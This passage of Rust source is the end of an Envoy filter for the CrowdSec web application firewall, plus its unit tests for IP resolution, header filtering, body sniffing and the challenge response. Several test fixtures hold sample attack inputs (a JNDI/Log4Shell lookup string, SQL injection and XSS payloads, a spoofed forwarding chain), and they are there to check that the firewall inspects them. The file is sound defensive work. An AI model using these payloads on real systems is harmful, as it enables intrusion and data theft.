        if self.config.crowdsec.appsec.async_mode {
            Action::Continue
        } else {
            Action::Pause
        }
    }

    fn on_http_request_body(&mut self, body_size: usize, end_of_stream: bool) -> Action {
        log::debug!(
            "on_http_request_body: body_size={}, end_of_stream={}",
            body_size,
            end_of_stream
        );

        if !self.config.crowdsec.appsec.enabled {
            return Action::Continue;
        }

        // AppSec already decided, let body flow
        if self.appsec_done {
            return Action::Continue;
        }

        // Nothing left to buffer: either this body is not ours to inspect, or the sniff
        // already ruled it out. The stream still has to be able to trigger the dispatch.
        if !self.request_has_body() || self.body_skipped {
            self.finalize_and_dispatch(end_of_stream);
            return Action::Continue;
        }

        // prevent 413 when buffer is bigger that 512k
        if self.appsec_pending && body_size > 512 * 1024 {
            return Action::Continue;
        }

        // This filter always returns Action::Continue for body chunks (so real
        // traffic isn't held up waiting on AppSec), and the host drains/forwards
        // each chunk once we do: body_size on each call is the size of the newly
        // arrived, not-yet-consumed chunk, not a cumulative total (confirmed
        // directly - under HTTP/2, each DATA frame reports only its own size).
        // So each call's readable region is a fresh chunk starting at its own
        // offset 0, and must be appended, not used to replace what's already
        // been accumulated.
        let max_size = self.max_body_size();
        let remaining = max_size.saturating_sub(self.body_data.len());
        let read_len = body_size.min(remaining);
        if read_len > 0 {
            match self.get_http_request_body(0, read_len) {
                Some(chunk) => {
                    log::debug!("Buffered {} more bytes of body", chunk.len());
                    self.body_data.extend_from_slice(&chunk);
                }
                None => log::warn!("get_http_request_body(0, {}) returned None", read_len),
            }
        }

        // Enough bytes to judge text vs binary without waiting for the whole body
        if self.body_data.len() >= SNIFF_PREFIX {
            self.decide_body_forwarding();
        }

        self.finalize_and_dispatch(end_of_stream);
        Action::Continue
    }

    fn on_http_request_trailers(&mut self, _num_trailers: usize) -> Action {
        if !self.config.crowdsec.appsec.enabled || self.appsec_done {
            return Action::Continue;
        }
        // Trailers, not a final DATA frame, terminate a request that has them: Envoy
        // delivers the last body chunk with end_stream=false and signals the end here,
        // so on_http_request_body never sees end_of_stream=true. Without this the AppSec
        // call is never dispatched at all and the request passes completely uninspected.
        log::debug!("Request trailers received, finalizing AppSec dispatch");
        self.finalize_and_dispatch(true);
        Action::Continue
    }

    fn on_http_response_headers(&mut self, _num_headers: usize, _end_of_stream: bool) -> Action {
        if self.appsec_pending && !self.config.crowdsec.appsec.async_mode {
            log::info!("AppSec pending, pausing response");
            self.response_paused = true;
            return Action::Pause;
        }
        Action::Continue
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_strip_port_ipv4_with_port() {
        assert_eq!(strip_port("1.2.3.4:8080"), "1.2.3.4");
    }

    #[test]
    fn test_strip_port_ipv4_bare() {
        assert_eq!(strip_port("1.2.3.4"), "1.2.3.4");
    }

    #[test]
    fn test_strip_port_bracketed_ipv6() {
        assert_eq!(strip_port("[::1]:8080"), "::1");
        assert_eq!(strip_port("[2001:db8::1]:443"), "2001:db8::1");
    }

    #[test]
    fn test_strip_port_bare_ipv6() {
        assert_eq!(strip_port("::1"), "::1");
        assert_eq!(strip_port("2001:db8::1"), "2001:db8::1");
    }

    #[test]
    fn test_parse_ipv6_basic_and_compressed() {
        assert_eq!(parse_ipv6("::1"), Some(1));
        assert_eq!(parse_ipv6("::"), Some(0));
        assert_eq!(parse_ipv6("2001:db8::1").unwrap() >> 96, 0x2001_0db8);
        assert_eq!(
            parse_ipv6("0000:0000:0000:0000:0000:0000:0000:0001"),
            Some(1)
        );
        // Leading-zero-insensitive: the same address written two ways must match
        assert_eq!(parse_ipv6("2001:0db8::0001"), parse_ipv6("2001:db8::1"));
    }

    #[test]
    fn test_parse_ipv6_embedded_ipv4_tail() {
        assert_eq!(parse_ipv6("::ffff:192.0.2.1"), Some(0xffff_c000_0201));
    }

    #[test]
    fn test_parse_ipv6_rejects_malformed() {
        assert!(parse_ipv6("").is_none());
        assert!(parse_ipv6("1.2.3.4").is_none());
        assert!(parse_ipv6("1::2::3").is_none());
        assert!(parse_ipv6("12345::1").is_none());
        assert!(parse_ipv6("1:2:3:4:5:6:7").is_none());
        assert!(parse_ipv6("gggg::1").is_none());
    }

    #[test]
    fn test_ip_in_cidr_ipv4_exact() {
        assert!(ip_in_cidr("10.0.0.1", "10.0.0.1"));
        assert!(!ip_in_cidr("10.0.0.2", "10.0.0.1"));
    }

    #[test]
    fn test_ip_in_cidr_ipv4_cidr() {
        assert!(ip_in_cidr("192.168.1.50", "192.168.1.0/24"));
        assert!(ip_in_cidr("192.168.0.1", "192.168.0.0/16"));
        assert!(!ip_in_cidr("192.169.0.1", "192.168.0.0/16"));
        assert!(ip_in_cidr("10.0.0.1", "0.0.0.0/0"));
    }

    #[test]
    fn test_ip_in_cidr_ipv4_slash32() {
        assert!(ip_in_cidr("10.0.0.1", "10.0.0.1/32"));
        assert!(!ip_in_cidr("10.0.0.2", "10.0.0.1/32"));
    }

    #[test]
    fn test_ip_in_cidr_ipv6_exact() {
        assert!(ip_in_cidr("::1", "::1"));
        assert!(!ip_in_cidr("::2", "::1"));
    }

    #[test]
    fn test_ip_in_cidr_ipv6_prefix() {
        // Previously unsupported: an IPv6 CIDR degraded to an exact string compare, so
        // an IPv6 trusted proxy could never match its own configured range.
        assert!(ip_in_cidr("2001:db8::1", "2001:db8::/32"));
        assert!(ip_in_cidr("2001:db8:ffff::abcd", "2001:db8::/32"));
        assert!(!ip_in_cidr("2001:db9::1", "2001:db8::/32"));
        assert!(ip_in_cidr("::1", "::/0"));
        assert!(!ip_in_cidr("2001:db8::1", "2001:db8::/129"));
    }

    #[test]
    fn test_ip_in_cidr_mixed_families_never_match() {
        assert!(!ip_in_cidr("::1", "10.0.0.0/8"));
        assert!(!ip_in_cidr("10.0.0.1", "2001:db8::/32"));
    }

    #[test]
    fn test_ip_in_cidr_rejects_empty() {
        // An empty entry must never match an empty/unresolved address, which would
        // otherwise mark an arbitrary peer as a trusted proxy.
        assert!(!ip_in_cidr("", ""));
        assert!(!ip_in_cidr("", "10.0.0.0/8"));
        assert!(!ip_in_cidr("10.0.0.1", ""));
    }

    #[test]
    fn test_is_trusted_ip_empty_list() {
        assert!(!is_trusted_ip("1.2.3.4", &[]));
    }

    #[test]
    fn test_is_trusted_ip_matches() {
        let trusted = vec!["10.0.0.0/8".to_string(), "192.168.1.100".to_string()];
        assert!(is_trusted_ip("10.5.6.7", &trusted));
        assert!(is_trusted_ip("192.168.1.100", &trusted));
        assert!(!is_trusted_ip("172.16.0.1", &trusted));
    }

    #[test]
    fn test_is_trusted_ip_skips_empty_entries() {
        assert!(!is_trusted_ip("", &["".to_string()]));
    }

    #[test]
    fn test_resolve_client_ip_no_trusted_proxies_uses_source() {
        // XFF must be ignored entirely when no proxy is trusted
        assert_eq!(
            resolve_client_ip("1.2.3.4", Some("9.9.9.9"), &[]),
            Some("1.2.3.4".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_untrusted_peer_ignores_xff() {
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("1.2.3.4", Some("9.9.9.9"), &trusted),
            Some("1.2.3.4".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_takes_rightmost_untrusted_hop() {
        // The client controls the left of the chain. With one trusted proxy in front,
        // the real client is the rightmost entry, not the leftmost - taking the leftmost
        // let any client behind a trusted proxy claim an arbitrary IP.
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("9.9.9.9, 5.5.5.5"), &trusted),
            Some("5.5.5.5".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_skips_trusted_hops_in_chain() {
        let trusted = vec!["10.0.0.0/8".to_string(), "172.16.0.0/12".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("5.5.5.5, 172.16.0.9, 10.0.0.2"), &trusted),
            Some("5.5.5.5".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_spoofed_prefix_is_not_reachable() {
        // Attacker prepends a fake hop; the genuine one appended by the proxy wins.
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("1.1.1.1, 2.2.2.2, 8.8.8.8"), &trusted),
            Some("8.8.8.8".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_all_hops_trusted_falls_back_to_source() {
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("10.0.0.5, 10.0.0.6"), &trusted),
            Some("10.0.0.1".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_stops_at_malformed_hop() {
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("5.5.5.5, not-an-ip"), &trusted),
            Some("10.0.0.1".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_strips_ports_from_hops() {
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("5.5.5.5:41234"), &trusted),
            Some("5.5.5.5".to_string())
        );
        assert_eq!(
            resolve_client_ip("10.0.0.1", Some("[2001:db8::1]:443"), &trusted),
            Some("2001:db8::1".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_missing_xff_falls_back_to_source() {
        let trusted = vec!["10.0.0.0/8".to_string()];
        assert_eq!(
            resolve_client_ip("10.0.0.1", None, &trusted),
            Some("10.0.0.1".to_string())
        );
    }

    #[test]
    fn test_resolve_client_ip_unresolvable_source_is_an_error() {
        // Empty or non-IP source addresses must surface as None so the caller applies
        // the fail policy instead of proceeding with a blank identity that matches no
        // blocklist entry.
        assert!(resolve_client_ip("", Some("1.2.3.4"), &[]).is_none());
        assert!(resolve_client_ip("/var/run/envoy.sock", None, &[]).is_none());
        assert!(resolve_client_ip("", None, &["".to_string()]).is_none());
    }

    #[test]
    fn test_encode_range_ipv4_masks_base() {
        let (is_v6, record) = encode_range("192.168.1.55/24").expect("should encode");
        assert!(!is_v6);
        assert_eq!(record.len(), RANGE_V4_CIDR_LEN);
        // Base is stored pre-masked so matching is a single AND
        assert_eq!(&record[..4], &[192, 168, 1, 0]);
        assert_eq!(&record[4..], &[255, 255, 255, 0]);
    }

    #[test]
    fn test_encode_range_bare_ip_is_host_route() {
        let (_, record) = encode_range("10.0.0.1").expect("should encode");
        assert_eq!(&record[4..], &[255, 255, 255, 255]);
    }

    #[test]
    fn test_encode_range_ipv6() {
        let (is_v6, record) = encode_range("2001:db8::/32").expect("should encode");
        assert!(is_v6);
        assert_eq!(record.len(), RANGE_V6_CIDR_LEN);
    }

    #[test]
    fn test_encode_range_rejects_garbage() {
        assert!(encode_range("not-a-cidr").is_none());
        assert!(encode_range("10.0.0.0/33").is_none());
        assert!(encode_range("2001:db8::/129").is_none());
        assert!(encode_range("10.0.0.0/abc").is_none());
        assert!(encode_range("").is_none());
    }

    /// Build a blob record that is live well past `now`
    fn live_range(cidr: &str) -> Vec<u8> {
        let (_, key) = encode_range(cidr).expect("should encode");
        with_expiry(10_000, &key)
    }

    #[test]
    fn test_match_v4_range_hit_and_miss() {
        let blob: Vec<u8> = [live_range("192.168.0.0/16"), live_range("10.0.0.0/8")].concat();

        assert_eq!(
            match_v4_range(parse_ipv4("10.5.6.7").unwrap(), &blob, 1_000),
            Some("10.0.0.0/8".to_string())
        );
        assert_eq!(
            match_v4_range(parse_ipv4("192.168.99.1").unwrap(), &blob, 1_000),
            Some("192.168.0.0/16".to_string())
        );
        assert!(match_v4_range(parse_ipv4("172.16.0.1").unwrap(), &blob, 1_000).is_none());
    }

    #[test]
    fn test_match_v4_range_empty_blob() {
        assert!(match_v4_range(parse_ipv4("10.0.0.1").unwrap(), &[], 1_000).is_none());
    }

    #[test]
    fn test_match_v4_range_ignores_expired_record() {
        // A missed `deleted` notification must not keep a range banned forever: the
        // record stops matching once the decision's own lifetime has run out.
        let blob = live_range("10.0.0.0/8");
        let ip = parse_ipv4("10.5.6.7").unwrap();
        assert!(match_v4_range(ip, &blob, 9_999).is_some());
        assert!(match_v4_range(ip, &blob, 10_000).is_none());
        assert!(match_v4_range(ip, &blob, 10_001).is_none());
    }

    #[test]
    fn test_match_v6_range_hit_and_miss() {
        let record = live_range("2001:db8::/32");
        assert!(
            match_v6_range(parse_ipv6("2001:db8::dead:beef").unwrap(), &record, 1_000).is_some()
        );
        assert!(match_v6_range(parse_ipv6("2001:db9::1").unwrap(), &record, 1_000).is_none());
        // Expired
        assert!(
            match_v6_range(parse_ipv6("2001:db8::dead:beef").unwrap(), &record, 20_000).is_none()
        );
    }

    #[test]
    fn test_split_and_with_expiry_roundtrip() {
        let stored = with_expiry(1_700_000_000_000, b"ban_crowdsecurity/http-probing");
        let (expires_at, payload) = split_expiry(&stored).expect("should split");
        assert_eq!(expires_at, 1_700_000_000_000);
        assert_eq!(payload, b"ban_crowdsecurity/http-probing");
    }

    #[test]
    fn test_split_expiry_rejects_short_value() {
        assert!(split_expiry(b"").is_none());
        assert!(split_expiry(b"short").is_none());
    }

    #[test]
    fn test_is_forwardable_header_drops_control_channel() {
        // A client-supplied X-Crowdsec-Appsec-* header must never reach AppSec: it would
        // override the API key, IP, URI or verb the WAF evaluates.
        assert!(!is_forwardable_header("X-Crowdsec-Appsec-Api-Key"));
        assert!(!is_forwardable_header("x-crowdsec-appsec-ip"));
        assert!(!is_forwardable_header("X-CROWDSEC-APPSEC-VERB"));
    }

    #[test]
    fn test_is_forwardable_header_drops_pseudo_and_framing() {
        assert!(!is_forwardable_header(":method"));
        assert!(!is_forwardable_header(":path"));
        assert!(!is_forwardable_header("content-length"));
        assert!(!is_forwardable_header("Transfer-Encoding"));
        assert!(!is_forwardable_header("connection"));
        assert!(!is_forwardable_header("host"));
    }

    #[test]
    fn test_is_forwardable_header_keeps_rule_relevant_headers() {
        assert!(is_forwardable_header("referer"));
        assert!(is_forwardable_header("Cookie"));
        assert!(is_forwardable_header("user-agent"));
        assert!(is_forwardable_header("content-type"));
        assert!(is_forwardable_header("X-Api-Version"));
        assert!(is_forwardable_header("Authorization"));
    }

    #[test]
    fn test_collect_client_headers_filters_and_preserves() {
        let headers = vec![
            (":method".to_string(), "POST".to_string()),
            (
                "referer".to_string(),
                "http://evil/${jndi:ldap://x}".to_string(),
            ),
            (
                "x-crowdsec-appsec-api-key".to_string(),
                "stolen".to_string(),
            ),
            ("content-length".to_string(), "42".to_string()),
            ("cookie".to_string(), "a=b".to_string()),
        ];
        let out = collect_client_headers(headers);
        assert_eq!(
            out,
            vec![
                (
                    "referer".to_string(),
                    "http://evil/${jndi:ldap://x}".to_string()
                ),
                ("cookie".to_string(), "a=b".to_string()),
            ]
        );
    }

    #[test]
    fn test_collect_client_headers_respects_byte_budget() {
        let big = "x".repeat(MAX_FORWARDED_HEADER_BYTES);
        let headers = vec![
            ("referer".to_string(), big),
            ("cookie".to_string(), "a=b".to_string()),
        ];
        let out = collect_client_headers(headers);
        // The oversized header alone exhausts the budget; nothing after it is relayed
        assert_eq!(out.len(), 0);
    }

    #[test]
    fn test_body_is_inspectable_empty_content_type() {
        assert!(body_is_inspectable(""));
    }

    #[test]
    fn test_body_is_inspectable_json() {
        assert!(body_is_inspectable("application/json"));
        assert!(body_is_inspectable("application/json; charset=utf-8"));
    }

    #[test]
    fn test_body_is_inspectable_form_and_text() {
        assert!(body_is_inspectable("application/x-www-form-urlencoded"));
        assert!(body_is_inspectable("text/plain"));
        assert!(body_is_inspectable("multipart/form-data; boundary=xyz"));
    }

    #[test]
    fn test_body_is_inspectable_vendor_json_xml_suffix() {
        assert!(body_is_inspectable("application/vnd.api+json"));
        assert!(body_is_inspectable("application/atom+xml"));
    }

    #[test]
    fn test_body_is_inspectable_binary_rejected() {
        assert!(!body_is_inspectable("application/octet-stream"));
        assert!(!body_is_inspectable("image/png"));
        assert!(!body_is_inspectable("application/zip"));
    }

    #[test]
    fn test_looks_binary_detects_nul_and_control_bytes() {
        assert!(looks_binary(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"));
        assert!(looks_binary(&[0x00; 64]));
        assert!(looks_binary(&(0u8..32).collect::<Vec<u8>>()));
    }

    #[test]
    fn test_looks_binary_detects_high_entropy_without_nul() {
        // Random/compressed payloads only reach ~11% control bytes, so the control-char
        // ratio alone misses them whenever no NUL lands in the sample. Without the
        // non-ASCII signal this was a coin flip on real uploads.
        let entropy: Vec<u8> = (0..512u32)
            .map(|i| {
                let v = (i.wrapping_mul(2654435761) >> 13) as u8;
                if v == 0 {
                    1
                } else {
                    v
                }
            })
            .collect();
        assert!(!entropy.contains(&0));
        assert!(looks_binary(&entropy));
    }

    #[test]
    fn test_looks_binary_accepts_dense_multibyte_text() {
        // Fully non-ASCII but with no control bytes: must not be mistaken for binary.
        let cjk = "\u{4f60}\u{597d}\u{4e16}\u{754c}".repeat(40);
        assert!(!looks_binary(cjk.as_bytes()));
    }

    #[test]
    fn test_looks_binary_ignores_stray_invalid_utf8() {
        // A single junk byte appended to a text payload must not flip the verdict -
        // otherwise the binary skip becomes a one-byte bypass again.
        let mut payload = b"<script>alert(document.cookie)</script>".to_vec();
        payload.push(0xff);
        assert!(!looks_binary(&payload));
    }

    #[test]
    fn test_looks_binary_accepts_text() {
        assert!(!looks_binary(b""));
        assert!(!looks_binary(br#"{"user":"admin' OR 1=1--"}"#));
        assert!(!looks_binary(b"name=value&other=thing\r\n"));
        // High bytes are ordinary UTF-8, not a binary signal
        assert!(!looks_binary("héllo wörld déjà vu".as_bytes()));
    }

    #[test]
    fn test_should_forward_body_honours_declared_text_type() {
        assert!(should_forward_body("application/json", br#"{"a":1}"#));
    }

    #[test]
    fn test_should_forward_body_skips_genuine_binary() {
        assert!(!should_forward_body(
            "application/octet-stream",
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR"
        ));
        assert!(!should_forward_body("image/png", &[0u8; 128]));
    }

    #[test]
    fn test_should_forward_body_inspects_mislabelled_text_payload() {
        // The WAF bypass this closes: declare a binary content type, send a text
        // injection payload, and the body used to skip inspection entirely.
        assert!(should_forward_body(
            "application/octet-stream",
            br#"{"q":"1' UNION SELECT password FROM users--"}"#
        ));
        assert!(should_forward_body(
            "image/png",
            b"<script>alert(document.cookie)</script>"
        ));
    }

    #[test]
    fn test_should_forward_body_empty_body_is_not_binary() {
        assert!(should_forward_body("application/octet-stream", b""));
    }

    #[test]
    fn test_sniff_content_type_json() {
        assert_eq!(sniff_content_type(br#"{"a":1}"#), "application/json");
        assert_eq!(sniff_content_type(b"  \n [1,2,3]"), "application/json");
    }

    #[test]
    fn test_sniff_content_type_defaults_to_form() {
        // Not parseable as key=value, but labelling it form-urlencoded still lands the
        // raw content in ARGS_NAMES, where the XSS rules can see it.
        assert_eq!(
            sniff_content_type(b"username=admin' OR 1=1--"),
            "application/x-www-form-urlencoded"
        );
        assert_eq!(
            sniff_content_type(b"<script>alert(1)</script>"),
            "application/x-www-form-urlencoded"
        );
        assert_eq!(sniff_content_type(b""), "application/x-www-form-urlencoded");
    }

    #[test]
    fn test_should_dispatch_appsec_at_size_threshold() {
        assert!(should_dispatch_appsec(false, false, false, 100, 100, false));
    }

    #[test]
    fn test_should_dispatch_appsec_below_threshold_mid_stream() {
        assert!(!should_dispatch_appsec(false, false, false, 50, 100, false));
    }

    #[test]
    fn test_should_dispatch_appsec_end_of_stream_triggers() {
        assert!(should_dispatch_appsec(false, false, false, 10, 100, true));
    }

    #[test]
    fn test_should_dispatch_appsec_skipped_body_dispatches_immediately() {
        // A body ruled out as binary never reaches the size threshold, so the
        // headers-only check has to fire on the skip flag instead of waiting for the
        // upload to finish.
        assert!(should_dispatch_appsec(false, false, true, 0, 100, false));
    }

    #[test]
    fn test_should_dispatch_appsec_skipped_while_pending() {
        // Regression: a call already in flight must not be re-dispatched even
        // though the buffer is full (this was the duplicate-dispatch bug).
        assert!(!should_dispatch_appsec(true, false, false, 100, 100, false));
    }

    #[test]
    fn test_should_dispatch_appsec_skipped_while_pending_at_end_of_stream() {
        assert!(!should_dispatch_appsec(true, false, false, 100, 100, true));
    }

    #[test]
    fn test_should_dispatch_appsec_not_after_verdict() {
        // Once AppSec has ruled, a late trailer or body chunk must not dispatch again.
        assert!(!should_dispatch_appsec(false, true, false, 100, 100, true));
        assert!(!should_dispatch_appsec(false, true, true, 0, 100, true));
    }

    #[test]
    fn test_parse_challenge_envelope_valid() {
        let body = br#"{
            "action": "challenge",
            "http_status": 200,
            "user_body_content": "<!DOCTYPE html><html></html>",
            "user_headers": {"Content-Type": ["text/html; charset=utf-8"]},
            "user_cookies": ["__crowdsec_challenge=abc; Path=/; HttpOnly"]
        }"#;
        let envelope = parse_challenge_envelope(body).expect("should parse");
        assert_eq!(envelope.action, "challenge");
        assert_eq!(envelope.http_status, 200);
        assert_eq!(envelope.user_body_content, "<!DOCTYPE html><html></html>");
        assert_eq!(
            envelope.user_cookies,
            vec!["__crowdsec_challenge=abc; Path=/; HttpOnly"]
        );
    }

    #[test]
    fn test_parse_challenge_envelope_non_challenge_action() {
        // Classic ban/captcha verdicts don't carry this envelope; must fall back to None.
        let body = br#"{"action": "ban", "http_status": 403, "user_body_content": ""}"#;
        assert!(parse_challenge_envelope(body).is_none());
    }

    #[test]
    fn test_parse_challenge_envelope_malformed_json() {
        assert!(parse_challenge_envelope(b"AppSec Access Denied").is_none());
    }

    #[test]
    fn test_parse_challenge_envelope_missing_required_field() {
        // Missing user_body_content should fail to deserialize, not panic.
        let body = br#"{"action": "challenge", "http_status": 200}"#;
        assert!(parse_challenge_envelope(body).is_none());
    }

    #[test]
    fn test_build_challenge_headers_flattens_multi_value_headers() {
        let mut user_headers = HashMap::new();
        user_headers.insert(
            "Content-Type".to_string(),
            vec!["text/html; charset=utf-8".to_string()],
        );
        user_headers.insert(
            "Cache-Control".to_string(),
            vec!["no-cache".to_string(), "no-store".to_string()],
        );
        let envelope = ChallengeEnvelope {
            action: "challenge".to_string(),
            http_status: 200,
            user_body_content: "<html></html>".to_string(),
            user_headers,
            user_cookies: vec!["__crowdsec_challenge=abc".to_string()],
        };

        let headers = build_challenge_headers(&envelope);
        assert_eq!(headers.len(), 4);
        assert!(headers.contains(&(
            "Content-Type".to_string(),
            "text/html; charset=utf-8".to_string()
        )));
        assert!(headers.contains(&("Cache-Control".to_string(), "no-cache".to_string())));
        assert!(headers.contains(&("Cache-Control".to_string(), "no-store".to_string())));
        assert!(headers.contains(&(
            "set-cookie".to_string(),
            "__crowdsec_challenge=abc".to_string()
        )));
    }

    #[test]
    fn test_build_challenge_headers_empty() {
        let envelope = ChallengeEnvelope {
            action: "challenge".to_string(),
            http_status: 200,
            user_body_content: String::new(),
            user_headers: HashMap::new(),
            user_cookies: vec![],
        };
        assert!(build_challenge_headers(&envelope).is_empty());
    }

    #[test]
    fn test_patch_csp_for_wasm_adds_to_script_src() {
        let csp = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self'";
        let patched = patch_csp_for_wasm(csp);
        assert_eq!(
            patched,
            "default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self'"
        );
    }

    #[test]
    fn test_patch_csp_for_wasm_falls_back_to_default_src() {
        // default-src is left intact; a script-src is derived from it instead, so
        // img-src/connect-src/frame-src inheritors are not silently widened
        let csp = "default-src 'self'; style-src 'self'";
        let patched = patch_csp_for_wasm(csp);
        assert_eq!(
            patched,
            "default-src 'self'; style-src 'self'; script-src 'self' 'unsafe-eval'"
        );
    }

    #[test]
    fn test_patch_csp_for_wasm_noop_when_already_allowed() {
        let csp = "script-src 'self' 'unsafe-eval'";
        assert_eq!(patch_csp_for_wasm(csp), csp);
    }

    #[test]
    fn test_patch_csp_for_wasm_upgrades_wasm_only_eval() {
        // 'wasm-unsafe-eval' alone only covers WebAssembly.instantiate, not plain
        // eval()/Function() - confirmed by Firefox's own "Missing 'unsafe-eval'"
        // console message when only 'wasm-unsafe-eval' was present. Must still add
        // the broader 'unsafe-eval'.
        let csp = "script-src 'self' 'wasm-unsafe-eval'";
        assert_eq!(
            patch_csp_for_wasm(csp),
            "script-src 'self' 'wasm-unsafe-eval' 'unsafe-eval'"
        );
    }

    #[test]
    fn test_patch_csp_for_wasm_noop_when_no_relevant_directive() {
        let csp = "img-src 'self' data:";
        assert_eq!(patch_csp_for_wasm(csp), csp);
    }

    #[test]
    fn test_patch_csp_for_wasm_ignores_script_src_elem_prefix_collision() {
        // "script-src-elem" must not be mistaken for "script-src" by a naive prefix check.
        let csp = "script-src-elem 'self'; default-src 'self'";
        let patched = patch_csp_for_wasm(csp);
        assert_eq!(
            patched,
            "script-src-elem 'self'; default-src 'self'; script-src 'self' 'unsafe-eval'"
        );
    }

    #[test]
    fn test_sanitize_challenge_status_passes_valid_codes() {
        assert_eq!(sanitize_challenge_status(200), 200);
        assert_eq!(sanitize_challenge_status(403), 403);
        assert_eq!(sanitize_challenge_status(599), 599);
        assert_eq!(sanitize_challenge_status(100), 100);
    }

    #[test]
    fn test_sanitize_challenge_status_rejects_out_of_range() {
        // send_http_response relays whatever it is handed, so a semi-trusted peer must
        // not be able to set an out-of-range status on the client's response.
        assert_eq!(sanitize_challenge_status(0), 403);
        assert_eq!(sanitize_challenge_status(99), 403);
        assert_eq!(sanitize_challenge_status(600), 403);
        assert_eq!(sanitize_challenge_status(65535), 403);
    }

    #[test]
    fn test_is_allowed_challenge_header() {
        assert!(is_allowed_challenge_header("Content-Type"));
        assert!(is_allowed_challenge_header("content-security-policy"));
        assert!(is_allowed_challenge_header("Set-Cookie"));
        // Framing, hop-by-hop and pseudo-headers must never be relayed
        assert!(!is_allowed_challenge_header("content-length"));
        assert!(!is_allowed_challenge_header("transfer-encoding"));
        assert!(!is_allowed_challenge_header("connection"));
        assert!(!is_allowed_challenge_header(":status"));
        assert!(!is_allowed_challenge_header("location"));
    }

    #[test]
    fn test_build_challenge_headers_drops_disallowed_names() {
        let mut user_headers = HashMap::new();
        user_headers.insert("Content-Type".to_string(), vec!["text/html".to_string()]);
        user_headers.insert("Content-Length".to_string(), vec!["999".to_string()]);
        user_headers.insert(":status".to_string(), vec!["200".to_string()]);
        user_headers.insert("Connection".to_string(), vec!["close".to_string()]);
        let envelope = ChallengeEnvelope {
            action: "challenge".to_string(),
            http_status: 200,
            user_body_content: String::new(),
            user_headers,
            user_cookies: vec![],
        };
        let headers = build_challenge_headers(&envelope);
        assert_eq!(
            headers,
            vec![("Content-Type".to_string(), "text/html".to_string())]
        );
    }

    #[test]
    fn test_patch_csp_for_wasm_derives_script_src_from_bare_default_src() {
        assert_eq!(
            patch_csp_for_wasm("default-src"),
            "default-src; script-src 'unsafe-eval'"
        );
    }

    #[test]
    fn test_build_challenge_headers_patches_csp() {
        let mut user_headers = HashMap::new();
        user_headers.insert(
            "Content-Security-Policy".to_string(),
            vec!["script-src 'self' 'unsafe-inline'".to_string()],
        );
        let envelope = ChallengeEnvelope {
            action: "challenge".to_string(),
            http_status: 200,
            user_body_content: String::new(),
            user_headers,
            user_cookies: vec![],
        };
        let headers = build_challenge_headers(&envelope);
        assert_eq!(
            headers,
            vec![(
                "Content-Security-Policy".to_string(),
                "script-src 'self' 'unsafe-inline' 'unsafe-eval'".to_string()
            )]
        );
    }
}
